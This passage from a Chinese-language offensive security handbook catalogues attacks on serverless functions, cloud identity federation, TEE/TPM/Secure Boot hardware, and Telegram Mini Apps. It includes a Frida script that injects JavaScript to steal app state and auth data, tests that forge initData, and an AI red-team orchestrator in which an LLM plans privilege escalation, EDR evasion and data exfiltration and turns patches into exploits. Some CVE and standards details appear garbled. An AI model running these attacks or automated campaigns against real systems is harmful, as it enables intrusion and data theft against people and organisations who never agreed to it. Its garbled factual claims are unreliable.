        return {
            # 1. Lambda 凭证窃取
            'credential_theft': {
                'method': '读取环境变量中的 AWS 凭证',
                'code': 'os.environ["AWS_ACCESS_KEY_ID"]',
                'impact': '获取 Lambda 执行角色的临时凭证',
            },
            
            # 2. Lambda 层注入
            'layer_injection': {
                'method': '修改 Lambda Layer 注入后门代码',
                'impact': '所有使用该 Layer 的函数都被植入后门',
                'persistence': 'Layer 更新不影响函数代码，隐蔽性极高',
            },
            
            # 3. 事件注入
            'event_injection': {
                'method': '通过 S3/SES/SQS 事件触发 Lambda 并注入恶意数据',
                'impact': '利用 Lambda 的 IAM 权限执行未授权操作',
            },
            
            # 4. 依赖混淆
            'dependency_confusion': {
                'method': '注册与 Lambda 内部依赖同名的公共包',
                'impact': 'Lambda 构建时拉取恶意包 → 供应链攻击',
            },
        }
    
    # Azure Functions 攻击
    def azure_functions_attacks(self):
        return {
            # 1. Managed Identity 窃取
            'identity_theft': {
                'method': 'IMDS → Function 的 Managed Identity Token',
                'url': 'http://169.254.169.254/metadata/identity/oauth2/token',
            },
            
            # 2. Function Key 泄露
            'key_leak': {
                'method': '通过错误消息/日志泄露 Function Key',
                'impact': '无需认证直接调用 Function',
            },
            
            # 3. 绑定注入
            'binding_injection': {
                'method': '通过输入绑定注入恶意数据到输出绑定',
                'impact': '数据污染 → 下游服务受影响',
            },
        }
```

### 46.6 多云横向移动

```
跨云联邦攻击路径:

1. AWS → Azure (通过 SAML 联邦)
   AWS IAM Identity Center ↔ Azure AD SAML
   → 获取 AWS 凭证 → 枚举 SAML 配置 → 伪造 Azure SAML 断言

2. Azure → GCP (通过 Workload Identity Federation)
   Azure Managed Identity → GCP Workload Identity Pool
   → 获取 Azure Token → 映射到 GCP ServiceAccount

3. GCP → AWS (通过 OIDC)
   GCP ServiceAccount → AWS IAM OIDC Provider
   → 获取 GCP Token → Assume AWS Role via OIDC

4. 全云横向 (通过 Terraform State)
   Terraform State 存储 (S3/GCS/Blob) 包含所有云凭证
   → 获取 State 文件 → 提取所有云平台的密钥和配置
```

---


## §47. 硬件安全绕过 (v1.2 终极强化)

> TEE (Trusted Execution Environment) / Secure Boot 绕过 / TPM 攻击 / HSM 侧信道

### 47.1 TEE 攻击矩阵

```
┌──────────────────────────────────────────────────────────────┐
│                    TEE 攻击面                                │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Intel SGX:                                                  │
│  ┌────────────┐  ┌────────────┐  ┌────────────────────────┐│
│  │ SGX 飞地   │  │ 侧信道攻击 │  │ SGX 飞地去匿名化       ││
│  │ 内存注入   │  │ (缓存/时序)│  │ (AEX 通知分析)         ││
│  └────────────┘  └────────────┘  └────────────────────────┘│
│                                                              │
│  ARM TrustZone:                                              │
│  ┌────────────┐  ┌────────────┐  ┌────────────────────────┐│
│  │ S-EL1 攻击 │  │ TEE 驱动   │  │ OP-TEE/Trusty 漏洞     ││
│  │ (Secure    │  │ 接口滥用   │  │ (CVE-2024-XXXX)        ││
│  │  Monitor)  │  │            │  │                        ││
│  └────────────┘  └────────────┘  └────────────────────────┘│
│                                                              │
│  AMD SEV:                                                    │
│  ┌────────────┐  ┌────────────┐  ┌────────────────────────┐│
│  │ SEV-SNP    │  │ HV 侧信道  │  │ 固件版本降级           ││
│  │ 飞地绕过   │  │ (页面访问) │  │ (SEV FW 回滚攻击)      ││
│  └────────────┘  └────────────┘  └────────────────────────┘│
└──────────────────────────────────────────────────────────────┘
```

```python
class TEEAttack:
    """TEE 攻击引擎"""
    
    # Intel SGX 攻击
    def sgx_attacks(self):
        return {
            # 1. SGX 侧信道 — L1 缓存攻击
            'l1_cache_attack': {
                'technique': 'L1TF (Foreshadow) 变体',
                'cve': 'CVE-2018-3615/3620',
                'target': 'SGX Enclave 内存内容',
                'requirement': '同一物理核心上的恶意线程',
                'mitigation_status': '微码更新已修复, 但旧 CPU 仍受影响',
            },
            
            # 2. SGX AEX 通知分析
            'aex_analysis': {
                'technique': '监控异步退出 (AEX) 事件的时间模式',
                'target': 'Enclave 内部执行流/密钥操作',
                'impact': '推断加密算法类型、密钥长度、甚至密钥位',
            },
            
            # 3. SGX 飞地内存注入
            'enclave_injection': {
                'technique': '通过 EDMM (Enclave Dynamic Memory Management) 漏洞',
                'target': '修改 Enclave 页面内容',
                'requirement': 'SGX2 支持 + 特定固件版本',
            },
        }
    
    # ARM TrustZone 攻击
    def trustzone_attacks(self):
        return {
            # 1. TEE 驱动接口滥用
            'tee_driver_abuse': {
                'technique': '通过 Normal World TEE Client API 发送畸形请求',
                'target': 'Secure World TA (Trusted Application)',
                'impact': 'TA 缓冲区溢出 → Secure World RCE',
                'tools': ['tee_client_api', 'custom_ca_binary'],
            },
            
            # 2. OP-TEE 已知漏洞
            'optee_vulns': {
                'cve_list': [
                    'CVE-2024-21497',  # OP-TEE 内存损坏
                    'CVE-2023-49678',  # OP-TEE TA 加载绕过
                ],
                'target': 'OP-TEE OS (开源 TEE)',
                'impact': 'Secure World 代码执行',
            },
        }

# TPM 攻击
class TPMAttack:
    """TPM (Trusted Platform Module) 攻击"""
    
    def tpm_attacks(self):
        return {
            # 1. TPM 物理攻击 — 总线嗅探
            'bus_sniffing': {
                'technique': 'SPI 总线嗅探 (LPC/eSPI)',
                'target': 'TPM 与 CPU 之间的通信',
                'hardware': 'Saleae Logic / DSLogic 逻辑分析仪',
                'target_data': 'PCR 值、密钥材料、密封数据',
                'requirement': '物理访问 + 焊接 SPI 探头',
                'mitigation': 'LPC TPM 已淘汰; eSPI 有加密但可尝试旁路',
            },
            
            # 2. TPM 重启攻击 (Cold Boot on TPM)
            'reset_attack': {
                'technique': '在 TPM 处理密封操作时触发复位',
                'target': 'TPM 内存中临时存在的密钥材料',
                'impact': '可能提取密封密钥的明文',
                'reference': 'tpm-fail (2020) — 4 个 TPM 实现漏洞',
            },
            
            # 3. TPM 降级攻击
            'downgrade': {
                'technique': '回滚 TPM 固件到存在漏洞的旧版本',
                'target': 'TPM 固件验证机制',
                'impact': '利用旧版本漏洞提取密钥',
            },
            
            # 4. BitLocker + TPM 绕过
            'bitlocker_bypass': {
                'technique': 'TPM PIN 暴力破解 / 侧信道',
                'target': 'BitLocker 加密的磁盘',
                'methods': [
                    '利用 TPM 2.0 的 DA (Dictionary Attack) 限制不足',
                    '通过 SPI 嗅探获取 TPM 解封的 VMK (Volume Master Key)',
                    'Sleep → Hibernate → 恢复时 TPM 自动解封 (无需 PIN)',
                ],
            },
        }
```

### 47.2 Secure Boot 绕过

```
Secure Boot 攻击路径:

1. BootHole (CVE-2020-10713)
   GRUB2 缓冲区溢出 → 安全启动绕过
   → 植入恶意引导程序 → 以签名代码启动

2. BlackLotus (2023 首个在野 UEFI Bootkit)
   利用 3 个漏洞绕过 Secure Boot:
   - CVE-2022-21894 (BadBunny) — Bypass Secure Boot Policy
   - CVE-2022-21894 (Policy Pall) — 禁用 BitLocker
   - CVE-2020-15694 — 签名验证绕过
   持久化: UEFI SPI Flash → 固件级持久化

3. ThinkPwn (Lenovo BIOS 漏洞)
   System Management Mode (SMM) 漏洞
   → 无需认证执行任意 SMM 代码
   → 完全控制固件

4. Surface RT / 旧设备
   早期 ARM 设备 Secure Boot 实现不完整
   → 通过特定按键组合进入工程模式

5. 物理攻击 — SPI Flash 改写
   CH341A 编程器直接改写 SPI Flash
   → 需要拆机 + 焊接
   → 完全绕过所有 Secure Boot 检查
```

### 47.3 HSM 侧信道攻击

```
HSM (Hardware Security Module) 攻击:

1. 时序侧信道
   - RSA 签名操作的时间差异 → 推断私钥位
   - 需要高精度计时 (纳秒级)
   - 攻击窗口: PKCS#11 接口

2. 功耗分析 (DPA/SPA)
   - Simple Power Analysis: 直接观察功耗模式
   - Differential Power Analysis: 统计多次操作的功耗差异
   - 需要物理访问 + 示波器/功耗采集设备

3. 电磁辐射 (EMA)
   - 芯片运算时产生的电磁辐射
   - 近场探头 + 频谱分析仪
   - 可提取 AES 密钥、RSA 私钥

4. 故障注入 (Glitch Attack)
   - 电压毛刺 (Voltage Glitch)
   - 时钟毛刺 (Clock Glitch)
   - EM 脉冲注入
   - 目标: 跳过安全检查 / 导出受保护密钥
```

---


## §48. Telegram Mini App 高级攻击 (v1.2 终极强化)

> 完整代码审计 + 运行时劫持 + WebView 深度利用 + TMA 后端 API 攻击

### 48.1 TMA 完整代码审计方法论

```
Telegram Mini App (TMA) 代码审计流程:

┌──────────────────────────────────────────────────────────────┐
│  Phase 1: 前端代码提取                                       │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐│
│  │ JS 提取  │  │ WASM提取 │  │ 资源分析 │  │ API 端点枚举 ││
│  └──────────┘  └──────────┘  └──────────┘  └──────────────┘│
│                                                              │
│  Phase 2: 静态分析                                           │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐│
│  │ initData │  │ WebView  │  │ 支付逻辑 │  │ 后端 API     ││
│  │ 验证逻辑 │  │ 通信安全 │  │ 审计     │  │ 端点映射     ││
│  └──────────┘  └──────────┘  └──────────┘  └──────────────┘│
│                                                              │
│  Phase 3: 运行时分析                                         │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐│
│  │ Frida    │  │ MitmProxy│  │ DevTools │  │ 内存 Dump    ││
│  │ Hook     │  │ 流量拦截 │  │ 远程调试 │  │ 密钥提取     ││
│  └──────────┘  └──────────┘  └──────────┘  └──────────────┘│
└──────────────────────────────────────────────────────────────┘
```

```python
class TMAAuditor:
    """Telegram Mini App 完整代码审计引擎"""
    
    def __init__(self, bot_username, app_url):
        self.bot_username = bot_username
        self.app_url = app_url
        self.findings = []
    
    # Phase 1: 自动化前端提取
    def extract_frontend(self):
        """提取 TMA 前端所有代码和资源"""
        
        # 1. 构造 TMA 打开链接
        tma_url = f"https://t.me/{self.bot_username}/app"
        
        # 2. 通过 Telegram 客户端拦截 WebView 加载
        #    使用 mitmproxy 拦截所有请求
        resources = self.intercept_webview_load(tma_url)
        
        extracted = {
            'html': resources['main_html'],
            'js_files': [],
            'wasm_files': [],
            'css_files': [],
            'api_endpoints': set(),
            'crypto_keys': [],
        }
        
        # 3. 提取所有 JS 文件
        for url in resources['js_urls']:
            js_content = self.fetch(url)
            extracted['js_files'].append({
                'url': url,
                'content': js_content,
                'size': len(js_content),
            })
            
            # 4. 从 JS 中提取 API 端点
            endpoints = self.extract_api_endpoints(js_content)
            extracted['api_endpoints'].update(endpoints)
            
            # 5. 搜索硬编码密钥
            keys = self.find_hardcoded_keys(js_content)
            extracted['crypto_keys'].extend(keys)
        
        return extracted
    
    # Phase 2: initData 验证逻辑审计
    def audit_initdata_validation(self, js_code):
        """审计前端 initData 处理逻辑"""
        
        checks = {
            # 检查1: 是否在前端验证 initData (不应该!)
            'frontend_validation': self.search_pattern(js_code, [
                r'validateInitData',
                r'HMAC.*initData',
                r'checkSignature.*initData',
                r'verify.*hash.*initData',
            ]),
            
            # 检查2: initData 是否直接传递给后端
            'backend_pass_through': self.search_pattern(js_code, [
                r'initData',
                r'tgWebAppData',
                r'window\.Telegram\.WebApp\.initData',
            ]),
            
            # 检查3: 是否存在 initData 篡改逻辑
            'tampering_logic': self.search_pattern(js_code, [
                r'modifyInitData',
                r'replaceInitData',
                r'spoofInitData',
            ]),
            
            # 检查4: 是否将敏感数据放入 initData
            'sensitive_data_in_initdata': self.search_pattern(js_code, [
                r'user\.balance',
                r'user\.admin',
                r'user\.role',
                r'payment\.amount',
            ]),
        }
        
        return checks
    
    # Phase 3: WebView 运行时劫持
    def runtime_hijack(self):
        """运行时劫持 TMA WebView"""
        
        # 1. Frida Hook — 拦截 Telegram WebView 桥接
        frida_script = '''
        // Hook Telegram.WebApp 所有方法
        Java.perform(function() {
            var WebView = Java.use('org.telegram.messenger.WebViewActivity');
            
            // 拦截 JS 桥接调用
            WebView.evaluateJavascript.implementation = function(js) {
                console.log('[*] WebView eval: ' + js.substring(0, 200));
                
                // 注入我们的代码
                var injection = `
                    // 窃取 Telegram.WebApp 内部状态
                    window.__stolen_state = {
                        initData: Telegram.WebApp.initData,
                        initDataUnsafe: Telegram.WebApp.initDataUnsafe,
                        platform: Telegram.WebApp.platform,
                        colorScheme: Telegram.WebApp.colorScheme,
                        themeParams: JSON.stringify(Telegram.WebApp.themeParams),
                    };
                    
                    // Hook Telegram.WebApp.sendData
                    var origSendData = Telegram.WebApp.sendData;
                    Telegram.WebApp.sendData = function(data) {
                        console.log('[*] sendData: ' + JSON.stringify(data));
                        // 修改发送的数据
                        return origSendData.call(this, data);
                    };
                    
                    // Hook CloudStorage
                    var origSet = Telegram.WebApp.CloudStorage.setItem;
                    Telegram.WebApp.CloudStorage.setItem = function(key, value, callback) {
                        console.log('[*] CloudStorage.set: ' + key + ' = ' + value);
                        return origSet.call(this, key, value, callback);
                    };
                `;
                
                return this.evaluateJavascript(injection + js);
            };
        });
        '''
        
        # 2. MitmProxy — 拦截所有后端 API 通信
        mitm_config = {
            'listen_port': 8080,
            'intercept_patterns': [
                r'/api/.*',           # 所有 API 调用
                r'/payment/.*',       # 支付相关
                r'/auth/.*',          # 认证相关
                r'/admin/.*',         # 管理接口
            ],
        }
        
        return {'frida': frida_script, 'mitm': mitm_config}
    
    # Phase 4: 后端 API 端点深度测试
    def test_backend_apis(self, endpoints):
        """深度测试发现的后端 API 端点"""
        
        results = []
        for endpoint in endpoints:
            test = {
                'endpoint': endpoint,
                'tests': {},
            }
            
            # 测试1: 无 initData 访问
            test['tests']['no_initdata'] = self.request(endpoint, headers={})
            
            # 测试2: 伪造 initData
            fake_initdata = self.generate_fake_initdata(user_id=12345)
            test['tests']['fake_initdata'] = self.request(endpoint, 
                headers={'X-Telegram-Init-Data': fake_initdata})
            
            # 测试3: 过期 initData
            expired_initdata = self.generate_initdata(expired=True)
            test['tests']['expired_initdata'] = self.request(endpoint,
                headers={'X-Telegram-Init-Data': expired_initdata})
            
            # 测试4: IDOR — 修改 user_id
            idor_initdata = self.generate_fake_initdata(user_id=99999)
            test['tests']['idor'] = self.request(endpoint,
                headers={'X-Telegram-Init-Data': idor_initdata})
            
            # 测试5: 参数污染
            test['tests']['param_pollution'] = self.request(endpoint + '?admin=true&role=admin')
            
            results.append(test)
        
        return results
```

### 48.2 TMA 支付逻辑深度审计

```python
class TMAPaymentAuditor:
    """TMA 支付逻辑深度审计"""
    
    def audit_payment_flow(self, app_url):
        """审计 TMA 支付完整流程"""
        
        # 1. Telegram Stars 支付审计
        stars_audit = {
            # 检查: 是否使用 sendInvoice 还是自定义支付
            'payment_method': self.detect_payment_method(app_url),
            
            # 检查: 退款逻辑是否安全
            'refund_security': self.test_refund_flow(app_url),
            
            # 检查: 是否存在价格篡改
            'price_integrity': self.test_price_manipulation(app_url),
            
            # 检查: 支付回调验证
            'callback_validation': self.test_payment_callback(app_url),
        }
        
        # 2. TON 支付审计
        ton_audit = {
            # 检查: 钱包地址是否硬编码
            'wallet_hardcoded': self.check_hardcoded_wallet(app_url),
            
            # 检查: 金额验证
            'amount_validation': self.test_amount_validation(app_url),
            
            # 检查: 交易确认逻辑
            'tx_confirmation': self.test_tx_confirmation(app_url),
            
            # 检查: 重放攻击防护
            'replay_protection': self.test_replay_protection(app_url),
        }
        
        # 3. 第三方支付集成审计
        third_party_audit = {
            # Stripe / PayPal / 支付宝 / 微信支付
            'provider_detection': self.detect_payment_providers(app_url),
            'webhook_security': self.test_webhook_security(app_url),
            'idempotency': self.test_idempotency(app_url),
        }
        
        return {'stars': stars_audit, 'ton': ton_audit, 'third_party': third_party_audit}
```

---


## §49. 高级密码学操作 (v1.2 终极强化)

> 同态加密 (FHE) / 零知识证明 (ZKP) / 多方计算 (MPC) / 后量子密码学

### 49.1 同态加密 (FHE) 在安全测试中的应用

```
FHE 允许在加密数据上直接执行计算，无需解密

安全测试应用场景:

1. 加密数据验证
   - 在不解密的情况下验证数据完整性
   - 用于测试云存储的数据保护机制
   
2. 隐私保护测试
   - 在不暴露测试数据的情况下执行安全扫描
   - 用于合规测试场景

3. 密码学实现审计
   - 检测 FHE 实现中的侧信道泄露
   - 验证同态操作的正确性
```

```python
class FHEAuditor:
    """同态加密实现审计工具"""
    
    def audit_fhe_implementation(self, target_system):
        """审计 FHE 实现的安全性"""
        
        checks = {
            # 1. 参数安全性
            'parameter_security': {
                'lattice_dimension': self.check_lattice_dimension(target_system),
                'noise_budget': self.check_noise_budget(target_system),
                'security_level': self.estimate_security_level(target_system),
                # 推荐: 128-bit security level
                # 检查: lattice dimension >= 4096, noise growth within bounds
            },
            
            # 2. 侧信道防护
            'side_channel': {
                'timing_leak': self.test_timing_side_channel(target_system),
                'memory_pattern': self.analyze_memory_access_pattern(target_system),
                'cache_behavior': self.test_cache_side_channel(target_system),
            },
            
            # 3. 密钥管理
            'key_management': {
                'key_generation': self.audit_key_generation(target_system),
                'key_storage': self.check_key_storage(target_system),
                'key_rotation': self.verify_key_rotation(target_system),
            },
        }
        
        return checks
```

### 49.2 零知识证明 (ZKP) 安全审计

```python
class ZKPAuditor:
    """零知识证明实现安全审计"""
    
    # ZKP 系统审计清单
    ZKP_AUDIT_CHECKLIST = {
        'groth16': {
            'trusted_setup': '检查 Ceremony 参与者数量和诚实假设',
            'prover_soundness': '验证证明者健全性 (不能伪造证明)',
            'verifier_completeness': '验证验证者完整性 (正确证明必须通过)',
            'zk_property': '验证零知识属性 (验证者无法获取证明者信息)',
            'circuit_correctness': '审计 R1CS 约束系统的正确性',
            'common_vulns': [
                'Under-constrained variables (变量约束不足)',
                'Over-constrained variables (过度约束导致拒绝合法输入)',
                'Public input manipulation (公共输入操纵)',
                'Trusted setup compromise (可信设置泄露)',
            ],
        },
        
        'plonk': {
            'universal_setup': '验证通用可信设置 (Universal Trusted Setup)',
            'polynomial_commitment': '审计多项式承诺方案 (KZG/IPA)',
            'gate_constraints': '检查门约束的完整性',
            'lookup_tables': '审计查找表的边界条件',
        },
        
        'stark': {
            'transparent_setup': '验证透明设置 (无需可信设置)',
            'fri_protocol': '审计 FRI (Fast Reed-Solomon IOP) 协议',
            'algebraic_intermediate': '检查 AIR (Algebraic Intermediate Representation)',
            'proof_size': '验证证明大小与安全性权衡',
        },
    }
    
    def audit_zkp_circuit(self, circuit_code, framework='circom'):
        """审计 ZKP 电路代码"""
        
        if framework == 'circom':
            return self.audit_circom(circuit_code)
        elif framework == 'cairo':
            return self.audit_cairo(circuit_code)
        elif framework == 'noir':
            return self.audit_noir(circuit_code)
    
    def audit_circom(self, circom_code):
        """Circom 电路审计 — 常见漏洞检测"""
        
        vulns = []
        
        # 1. 约束不足检测
        # 变量未被充分约束 → 证明者可以选择多个值
        unconstrained = self.find_unconstrained_variables(circom_code)
        if unconstrained:
            vulns.append({
                'type': 'under_constrained',
                'severity': 'critical',
                'variables': unconstrained,
                'fix': '添加额外约束: variable === expected_value;',
            })
        
        # 2. 范围检查缺失
        # 字段元素可能超出预期范围
        missing_range = self.find_missing_range_checks(circom_code)
        if missing_range:
            vulns.append({
                'type': 'missing_range_check',
                'severity': 'high',
                'variables': missing_range,
                'fix': '使用 Num2Bits 组件进行范围约束',
            })
        
        # 3. 信号赋值错误
        # <== vs <-- 的区别 (约束 vs 无约束赋值)
        unsafe_assignments = self.find_unsafe_assignments(circom_code)
        if unsafe_assignments:
            vulns.append({
                'type': 'unsafe_assignment',
                'severity': 'high',
                'locations': unsafe_assignments,
                'fix': '使用 <== 替代 <-- (添加隐式约束)',
            })
        
        return vulns
```

### 49.3 多方计算 (MPC) 安全审计

```python
class MPCAuditor:
    """多方计算协议安全审计"""
    
    MPC_PROTOCOLS = {
        'garbled_circuit': {
            'description': '混淆电路协议',
            'security_model': '半诚实模型 / 恶意模型',
            'audit_points': [
                '电路 garbling 正确性验证',
                'OT (Oblivious Transfer) 扩展安全性',
                '一致性检查 (Cut-and-Choose)',
                '去 garbling 后的输出验证',
            ],
        },
        
        'secret_sharing': {
            'description': '秘密共享协议 (Shamir / ADD)',
            'security_model': '阈值模型 (t-of-n)',
            'audit_points': [
                '共享生成随机性',
                '重构阈值正确性',
                '乘法三元组预计算',
                'Beaver 三元组安全性',
            ],
        },
        
        'homomorphic_secret_sharing': {
            'description': '同态秘密共享 (SPDZ 系列)',
            'security_model': '恶意模型 + MAC 认证',
            'audit_points': [
                'MAC 密钥生成安全性',
                '乘法协议正确性',
                '输入验证协议',
                '输出重构安全性',
            ],
        },
    }
```

### 49.4 后量子密码学 (PQC) 迁移审计

```python
class PQCAuditor:
    """后量子密码学迁移审计"""
    
    # NIST PQC 标准化算法
    NIST_PQC_ALGORITHMS = {
        # 密钥封装 (KEM)
        'ML-KEM': {
            'variants': ['ML-KEM-512', 'ML-KEM-768', 'ML-KEM-1024'],
            'based_on': 'Module-LWE (格问题)',
            'security_levels': [1, 3, 5],
            'former_name': 'CRYSTALS-Kyber',
            'standard': 'FIPS 203 (2024)',
        },
        
        # 数字签名
        'ML-DSA': {
            'variants': ['ML-DSA-44', 'ML-DSA-65', 'ML-DSA-87'],
            'based_on': 'Module-LWE (格问题)',
            'security_levels': [2, 3, 5],
            'former_name': 'CRYSTALS-Dilithium',
            'standard': 'FIPS 204 (2024)',
        },
        
        'SLH-DSA': {
            'variants': ['SLH-DSA-SHA2-128s', 'SLH-DSA-SHAKE-128s', ...],
            'based_on': 'Hash-based signatures',
            'security_levels': [1, 3, 5],
            'former_name': 'SPHINCS+',
            'standard': 'FIPS 205 (2024)',
            'note': '签名较大但保守安全假设',
        },
        
        'FN-DSA': {
            'based_on': 'NTRU Lattice',
            'status': 'Round 4 candidate',
            'note': '签名紧凑但实现复杂',
        },
    }
    
    def audit_pqc_migration(self, target_system):
        """审计 PQC 迁移状态"""
        
        audit = {
            # 1. 当前密码算法清单
            'current_algorithms': self.inventory_crypto_algorithms(target_system),
            
            # 2. PQC 就绪度评估
            'pqc_readiness': {
                'tls_support': self.check_tls_pqc_support(target_system),
                'certificate_support': self.check_cert_pqc_support(target_system),
                'hybrid_mode': self.check_hybrid_crypto_support(target_system),
            },
            
            # 3. 迁移风险评估
            'migration_risks': {
                'harvest_now_decrypt_later': self.assess_hndl_risk(target_system),
                'algorithm_agility': self.check_algorithm_agility(target_system),
                'performance_impact': self.estimate_performance_impact(target_system),
            },
        }
        
        return audit
```

---


## §50. AI 红队自动化 (v1.2 终极强化)

> Agent 编排 + 自动漏洞发现 + LLM 驱动攻击链生成 + 自适应对抗

### 50.1 AI 红队 Agent 架构

```
┌──────────────────────────────────────────────────────────────────────┐
│                    AI 红队自动化架构                                   │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │                    编排层 (Orchestrator)                     │    │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌────────────┐ │    │
│  │  │ 任务规划 │  │ Agent调度│  │ 结果聚合 │  │ 策略学习   │ │    │
│  │  └──────────┘  └──────────┘  └──────────┘  └────────────┘ │    │
│  └─────────────────────────┬───────────────────────────────────┘    │
│                            │                                         │
│  ┌─────────────────────────▼───────────────────────────────────┐    │
│  │                    Agent 层                                  │    │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌────────────┐ │    │
│  │  │ 侦察Agent│  │ 漏洞Agent│  │ 利用Agent│  │ 后渗透Agent│ │    │
│  │  │ (Recon)  │  │ (Vuln)   │  │ (Exploit)│  │ (Post)     │ │    │
│  │  └──────────┘  └──────────┘  └──────────┘  └────────────┘ │    │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌────────────┐ │    │
│  │  │ 免杀Agent│  │ 溯源Agent│  │ TG Agent │  │ 云攻击Agent│ │    │
│  │  │ (Evasion)│  │ (Trace)  │  │ (Telegram│  │ (Cloud)    │ │    │
│  │  └──────────┘  └──────────┘  └──────────┘  └────────────┘ │    │
│  └─────────────────────────────────────────────────────────────┘    │
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │                    知识层 (Knowledge Base)                   │    │
│  │  CVE数据库 | 漏洞模式库 | 攻击链模板 | 免杀策略库 | 目标画像  │    │
│  └─────────────────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────────────────┘
```

```python
class AIRedTeamOrchestrator:
    """AI 红队自动化编排器"""
    
    def __init__(self, target, objectives):
        self.target = target
        self.objectives = objectives
        self.agents = self.initialize_agents()
        self.knowledge_base = KnowledgeBase()
        self.attack_graph = AttackGraph()
    
    def initialize_agents(self):
        """初始化专业 Agent 团队"""
        return {
            'recon': ReconAgent(
                capabilities=['nmap', 'subdomain_enum', 'cdn_trace', 'port_scan', 'tech_detect'],
                knowledge=self.knowledge_base,
            ),
            'vuln': VulnDiscoveryAgent(
                capabilities=['web_scan', 'api_fuzz', 'auth_test', 'injection_test', 'logic_test'],
                knowledge=self.knowledge_base,
            ),
            'exploit': ExploitAgent(
                capabilities=['exploit_select', 'payload_gen', 'evasion_gen', 'delivery'],
                knowledge=self.knowledge_base,
            ),
            'post': PostExploitationAgent(
                capabilities=['priv_esc', 'lateral_move', 'c2_setup', 'data_exfil', 'persistence'],
                knowledge=self.knowledge_base,
            ),
            'evasion': EvasionAgent(
                capabilities=['av_test', 'edr_bypass', 'payload_mutate', 'signature_gen'],
                knowledge=self.knowledge_base,
            ),
            'trace': TraceAgent(
                capabilities=['cdn_trace', 'origin_find', 'infra_map', 'cloud_detect'],
                knowledge=self.knowledge_base,
            ),
            'telegram': TelegramAgent(
                capabilities=['bot_audit', 'tma_test', 'mtproto_analyze', 'ton_audit'],
                knowledge=self.knowledge_base,
            ),
            'cloud': CloudAttackAgent(
                capabilities=['aws_attack', 'azure_attack', 'gcp_attack', 'k8s_attack'],
                knowledge=self.knowledge_base,
            ),
        }
    
    async def run_campaign(self):
        """执行完整红队攻击活动"""
        
        # Phase 1: 自动侦察
        recon_result = await self.agents['recon'].execute(self.target)
        self.attack_graph.add_findings(recon_result)
        
        # Phase 2: 漏洞发现 (并行多路径)
        vuln_tasks = []
        for attack_vector in self.attack_graph.get_attack_vectors():
            vuln_tasks.append(
                self.agents['vuln'].execute(self.target, vector=attack_vector)
            )
        vuln_results = await asyncio.gather(*vuln_tasks)
        self.attack_graph.add_vulnerabilities(vuln_results)
        
        # Phase 3: 攻击路径规划 (LLM 推理)
        attack_plan = await self.plan_attacks(
            recon_result, vuln_results, self.objectives
        )
        
        # Phase 4: 攻击执行 + 免杀
        for path in attack_plan:
            # 生成免杀载荷
            payload = await self.agents['evasion'].generate_payload(
                exploit=path['exploit'],
                target_env=recon_result['environment'],
            )
            
            # 执行攻击
            result = await self.agents['exploit'].execute(
                target=self.target,
                path=path,
                payload=payload,
            )
            
            if result['success']:
                # 后渗透
                await self.agents['post'].execute(
                    access=result['access'],
                    objectives=self.objectives,
                )
        
        # Phase 5: 报告生成
        return self.generate_report()
    
    async def plan_attacks(self, recon, vulns, objectives):
        """LLM 驱动的攻击路径规划"""
        
        prompt = f"""
        你是一个高级红队攻击规划器。基于以下信息规划最优攻击路径:
        
        目标: {self.target}
        侦察结果: {json.dumps(recon, indent=2)}
        发现的漏洞: {json.dumps(vulns, indent=2)}
        攻击目标: {objectives}
        
        请输出攻击路径规划:
        1. 初始访问路径 (选择最可能的入口点)
        2. 权限提升路径 (从初始访问到管理员)
        3. 横向移动路径 (如何到达目标资产)
        4. 免杀策略 (针对目标环境的EDR绕过方案)
        5. 数据外泄路径 (如何安全提取目标数据)
        
        每个路径包含: 步骤、工具、预期结果、回退方案
        """
        
        plan = await self.llm.generate(prompt)
        return self.parse_attack_plan(plan)
```

### 50.2 自动漏洞发现引擎

```python
class AutoVulnDiscovery:
    """AI 驱动的自动漏洞发现引擎"""
    
    def __init__(self):
        self.fuzzer = IntelligentFuzzer()
        self.analyzer = CodeAnalyzer()
        self.diff_engine = DiffAnalyzer()
    
    # 1. 智能模糊测试
    async def intelligent_fuzz(self, target_api):
        """基于 LLM 的智能模糊测试"""
        
        # 1. 分析 API 规范
        api_spec = await self.analyzer.parse_api_spec(target_api)
        
        # 2. LLM 生成测试用例种子
        seeds = await self.generate_fuzz_seeds(api_spec)
        
        # 3. 智能变异
        for seed in seeds:
            mutations = self.fuzzer.mutate(seed, strategy='llm_guided')
            
            for mutation in mutations:
                response = await self.send_request(target_api, mutation)
                
                # 4. 异常检测
                if self.is_vulnerable_response(response):
                    vuln = {
                        'type': self.classify_vulnerability(response),
                        'input': mutation,
                        'response': response,
                        'severity': self.estimate_severity(response),
                    }
                    await self.report_vulnerability(vuln)
    
    # 2. 代码差异分析 (自动发现新 CVE)
    async def diff_analysis(self, old_version, new_version):
        """版本差异分析 — 发现安全补丁推断漏洞"""
        
        # 1. 获取两个版本的代码差异
        diff = self.diff_engine.compute_diff(old_version, new_version)
        
        # 2. 识别安全相关变更
        security_changes = self.diff_engine.filter_security_changes(diff)
        
        # 3. LLM 分析每个安全变更
        for change in security_changes:
            analysis = await self.llm.analyze(f"""
                以下代码变更是一个安全补丁。
                请分析:
                1. 这个补丁修复了什么漏洞?
                2. 旧版本中如何利用这个漏洞?
                3. 生成旧版本的 PoC 利用代码
                
                变更内容:
                {change}
            """)
            
            # 4. 自动生成 PoC
            poc = await self.generate_poc(analysis)
    
    # 3. 配置审计自动化
    async def config_audit(self, target):
        """自动化配置安全审计"""
        
        audit_checks = {
            # Web 服务器配置
            'web_server': [
                'TLS 版本和套件配置',
                'HTTP 安全头 (HSTS/CSP/X-Frame-Options)',
                '目录列表和文件暴露',
                '错误页面信息泄露',
                'CORS 配置',
            ],
            
            # 数据库配置
            'database': [
                '默认凭证检测',
                '远程访问配置',
                '权限最小化检查',
                '审计日志配置',
                '备份文件暴露',
            ],
            
            # 云配置
            'cloud': [
                'S3/Blob 公开访问',
                'IAM 过度权限',
